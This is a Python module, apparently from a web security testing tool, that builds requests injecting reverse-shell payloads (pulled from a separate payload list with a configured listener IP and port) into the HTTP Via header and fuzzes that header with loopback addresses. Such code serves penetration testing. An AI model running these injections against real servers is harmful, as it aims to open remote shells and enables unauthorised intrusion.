from headers.static_values import *
from worker import *
from utils import *
import requests

class Via():

    def __init__(self, destination):
        self.destination       = destination
        self.mime_types        = MimeTypes.get_mime_list()
        self.payloads          = Payloads.get_payload_list(Config.revshell_ip, Config.revshell_port)
        self.test_array        = []

    def revshell_tests(self):
        for payload in self.payloads:
            self.test_array.append(
                PreRequest(
                    req_type = "GET",
                    destination = self.destination,
                    payload = payload,
                    headers = {
                        "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
                        "Via" : payload
                    },
                    body = None,
                    expected_status_code = Config.initial_response.status_code
                )
            )

    def via_fuzz_tests(self):
        via_fuzz = [
            "HTTP/1.0 localhost",
            "HTTP/1.0 localhost.localhost",
            "HTTP/1.0 0.0.0.0",
            "HTTP/1.0 127.0.0.1",
            "HTTP/1.0 [::1]",
            "HTTP/1.1 localhost",
            "HTTP/1.1 localhost.localhost",
            "HTTP/1.1 0.0.0.0",
            "HTTP/1.1 127.0.0.1",
            "HTTP/1.1 [::1]",
            "HTTP/2.0 localhost",
            "HTTP/2.0 localhost.localhost",
            "HTTP/2.0 0.0.0.0",
            "HTTP/2.0 127.0.0.1",
            "HTTP/2.0 [::1]",
            "HTTP/3.0 localhost",
            "HTTP/3.0 localhost.localhost",
            "HTTP/3.0 0.0.0.0",
            "HTTP/3.0 127.0.0.1",
            "HTTP/3.0 [::1]",
            "FTP/1.0 localhost",
            "FTP/1.0 localhost.localhost",
            "FTP/1.0 0.0.0.0",
            "FTP/1.0 127.0.0.1",
            "FTP/1.0 [::1]",
            "ABC/1.0 localhost",
            "ABC/1.0 localhost.localhost",
            "ABC/1.0 0.0.0.0",
            "ABC/1.0 127.0.0.1",
            "ABC/1.0 [::1]"
        ]

        for via in via_fuzz:
            self.test_array.append(
                PreRequest(
                    req_type = "GET",
                    destination = self.destination,
                    payload = via,
                    headers = {
                        "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
                        "Via" : via
                    },
                    body = None,
                    expected_status_code = Config.initial_response.status_code
                )
            )

    def generate_tests(self):
        if Config.test_level >= Config.TEST_LEVEL_OPTIMAL:
            self.revshell_tests()
            self.via_fuzz_tests()

    def get_tests(self):
        self.generate_tests()
        return self.test_array